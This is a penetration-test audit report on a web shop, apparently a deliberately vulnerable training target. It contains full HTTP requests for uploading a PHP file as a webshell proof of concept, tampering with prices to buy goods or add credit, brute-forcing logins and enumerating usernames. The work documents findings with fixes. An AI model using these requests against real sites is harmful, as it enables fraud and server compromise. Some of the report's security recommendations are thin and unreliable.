### Aduit report for SECURITY BRIGADE. 

## Contents
- Date

- Scope

- Vulnerabilites
  
 - Critical Impact
    - RCE.
 
 - High Impact
    - Buying anything!
    - Filling Up account balance.
    
  
  - Medium Impact
    - Information disclosure.
    
  - Low Impact
    - No rate limit.

    
## Date
A pentest aduit was performed for the **SECURITY BRIGADE** at **Wednesday, 30 September 2020**. 

## Scope
Scope was limited to: **http://foophones.securitybrigade.com:8080/**

## Vulnerabilites
Vulnerabilites founded are listed according to their impact levels, explanations, and potential recommendations.

### Critical Impact
##### RCE
It was found that the upload functionality located at Register page is vulnerable to rce.
Note: For the sake of poc only phpinfo file was called from the backend as it's tends to be a customer based audit.

- Request => 
```
POST /register_confirm.php HTTP/1.1
Host: foophones.securitybrigade.com:8080
Content-Length: 715
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://foophones.securitybrigade.com:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5mUqBA2v8K1dcRb0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://foophones.securitybrigade.com:8080/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=4fpnkj94edkf83ug1ge89keni4
Connection: close

------WebKitFormBoundary5mUqBA2v8K1dcRb0
Content-Disposition: form-data; name="fname"

shivang3
------WebKitFormBoundary5mUqBA2v8K1dcRb0
Content-Disposition: form-data; name="lname"

kumar3
------WebKitFormBoundary5mUqBA2v8K1dcRb0
Content-Disposition: form-data; name="country"

india3
------WebKitFormBoundary5mUqBA2v8K1dcRb0
Content-Disposition: form-data; name="user"

shivang3
------WebKitFormBoundary5mUqBA2v8K1dcRb0
Content-Disposition: form-data; name="pass"

password
------WebKitFormBoundary5mUqBA2v8K1dcRb0
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>

------WebKitFormBoundary5mUqBA2v8K1dcRb0--
```
- Request to call the file =>
**http://foophones.securitybrigade.com:8080/images/avatars/shell.php**


The attack was successful as there was no restrictions in extentions and what data type was allowed.
![Alt Text](https://i.ibb.co/k57x6LJ/screencapture-foophones-securitybrigade-8080-images-avatars-shell-php-2020-09-30-01-00-52.png)

- Recommendation:
Uploaded data should have a proper file/extension/mime declared before passing it to the database.



### High Impact

##### Buying anything!
It was found that an attacker can buy anything from **http://foophones.securitybrigade.com:8080/buy_confirm.php** regardless of what amount of credit is availabe in his/her account. By manipulating the buying request as 

- Request => 
```
POST /buy_confirm.php HTTP/1.1
Host: foophones.securitybrigade.com:8080
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://foophones.securitybrigade.com:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://foophones.securitybrigade.com:8080/buy.php?id=1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=vc0cbm4jegj5m05cceg2l72k01
Connection: close

shipping=Finding&price=1&id=1
```
Note: Price parameter is changed from it's original value to 1.

- Response (interesting part only!) =>
```
					
					<font color=green>Thank you for your purchase! The product will be shipped to : Finding</font>		</div>
		<div id="sidebar">		
		
		
		<h2>Your credit is now: $98</h2>


Filling account !
```
- Recommendation:
  User supplied data shloud be propelry checked before sending it to backend.

##### Filling Up account balance.
It was found that the same above attack senerio could be used by an attacker to fill his/her account. By manipulating the buying request as.

- Request => 
```
POST /buy_confirm.php HTTP/1.1
Host: foophones.securitybrigade.com:8080
Content-Length: 31
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://foophones.securitybrigade.com:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://foophones.securitybrigade.com:8080/buy.php?id=5
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=vc0cbm4jegj5m05cceg2l72k01
Connection: close

shipping=chekc&price=-1000&id=5
```
Note: Price parameter is changed from it's original value to -1000.

- Response (interesting part only!) =>
```
font color=green>Thank you for your purchase! The product will be shipped to : chekc</font>		</div>
		<div id="sidebar">		
		
		
		<h2>Your credit is now: $7573</h2>
		
				
		</div>
		<div style="clear: both;">&nbsp;</div>
	</div>
	<div id="footer">
		<p>&copy;&nbsp;Copyright 2009. Security Brigade </p>
	</div>
```
- Attacker's account after buying and fillup up credit.
  ![Alt Text](https://i.ibb.co/NTPKp7B/screencapture-foophones-securitybrigade-8080-myaccount-php-2020-09-30-00-34-25.png)

- Recommendation:
  Backend code shloud not accept negative values.
  
### Medium Impact

#####  Information disclosure
It was found that **/logs.txt** and **/logs** where exposed at **http://foophones.securitybrigade.com:8080/logs**  and **http://foophones.securitybrigade.com:8080/logs.txt** which contains response for backend servers

This infomation can lead to a an issue if it contains critical informations.

- Recommendation: It best  not make this ciritcal endpoints public or having a proper 403 forbidden access in place can fix it too.


### Low Impact

##### No rate limit.
It was found that there is not rate limit implementation were in place at **http://foophones.securitybrigade.com:8080/login.php** which could lead to account takeover via brute force.

Request (Brute force attempt) =>
```
POST /login.php HTTP/1.1
Host: foophones.securitybrigade.com:8080
Content-Length: 28
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://foophones.securitybrigade.com:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://foophones.securitybrigade.com:8080/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=vc0cbm4jegj5m05cceg2l72k01
Connection: close

user=shivang&pass=qwerty1234
```

Response => 
```
HTTP/1.1 302 Found
Date: Wed, 30 Sep 2020 08:52:54 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Location: login.php
Vary: Accept-Encoding
Content-Length: 0
Connection: close
Content-Type: text/html
```

Attacker could request above requets as many times without being rate limited util he/she get's a response like,

```
HTTP/1.1 302 Found
Date: Wed, 30 Sep 2020 08:52:58 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Location: myaccount.php
Vary: Accept-Encoding
Content-Length: 0
Connection: close
Content-Type: text/html
```
Which now contains a redirection for ** myaccount.php** endpoint.

Attacker just need to know the usernames which could be enumerated from register section as it tends to show if  username exists or not. Like,

- Request =>
```
GET /check_user.php?user=shivang&timeStamp=1601451674798 HTTP/1.1
Host: foophones.securitybrigade.com:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Referer: http://foophones.securitybrigade.com:8080/register.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _ga=GA1.2.1263643996.1601440842; _gid=GA1.2.13543791.1601440842; PHPSESSID=4fpnkj94edkf83ug1ge89keni4
Connection: close
```
- Response =>
```
HTTP/1.1 200 OK
Date: Wed, 30 Sep 2020 07:39:23 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Vary: Accept-Encoding
Content-Length: 40
Connection: close
Content-Type: text/html


<font color=red>Username exists</font>
```
- Recommendation: Having a google captcha can fix this issue.
